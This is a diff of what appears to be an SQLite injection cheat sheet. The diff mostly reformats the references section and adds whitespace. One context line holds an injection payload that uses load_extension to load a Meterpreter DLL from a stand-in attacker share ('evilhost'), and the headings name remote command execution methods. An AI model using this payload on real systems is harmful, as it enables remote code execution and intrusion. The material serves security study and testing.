@@ -15,6 +15,8 @@
 * [Remote Command Execution using SQLite command - Attach Database](#remote-command-execution-using-sqlite-command---attach-database)
 * [Remote Command Execution using SQLite command - Load_extension](#remote-command-execution-using-sqlite-command---load_extension)
 * [References](#references)
+
+
 ## SQLite comments
 
 ```sql
@@ -114,7 +116,9 @@ UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');
 
 Note: By default this component is disabled
 
+
 ## References
 
-[Injecting SQLite database based application - Manish Kishan Tanwar](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf)
-[SQLite Error Based Injection for Enumeration](https://rioasmara.com/2021/02/06/sqlite-error-based-injection-for-enumeration/)
+* [Injecting SQLite database based application - Manish Kishan Tanwar - February 14, 2017](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf)
+* [SQLite Error Based Injection for Enumeration - Rio Asmara Suryadi - February 6, 2021](https://rioasmara.com/2021/02/06/sqlite-error-based-injection-for-enumeration/)
+* [SQLite3 Injection Cheat sheet - Nickosaurus Hax - May 31, 2012](https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet)
